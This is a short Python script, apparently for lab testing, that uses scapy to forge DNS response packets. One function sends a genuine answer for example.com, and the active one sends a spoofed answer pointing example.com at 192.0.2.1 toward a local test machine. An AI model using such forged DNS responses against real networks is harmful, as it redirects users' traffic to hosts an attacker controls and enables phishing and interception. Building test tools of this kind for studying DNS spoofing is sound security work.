from scapy.all import *


def send_legitimate_response():
    ip = IP(dst="127.0.0.1")  # Replace with the IP of your testing machine
    udp = UDP(sport=53, dport=RandShort())
    dns = DNS(id=1, qr=1, qdcount=1, ancount=1,
              qd=DNSQR(qname="example.com"),
              an=DNSRR(rrname="example.com", rdata="93.184.216.34"))
    packet = ip / udp / dns
    send(packet)


def send_spoofed_response():
    # todo
    ip = IP(dst="192.168.1.167")  # Replace with the IP of your testing machine
    udp = UDP(sport=53, dport=RandShort())
    dns = DNS(id=1, qr=1, qdcount=1, ancount=1,
              qd=DNSQR(qname="example.com"),
              an=DNSRR(rrname="example.com", rdata="192.0.2.1"))
    packet = ip / udp / dns
    send(packet)


# send_legitimate_response()
send_spoofed_response()
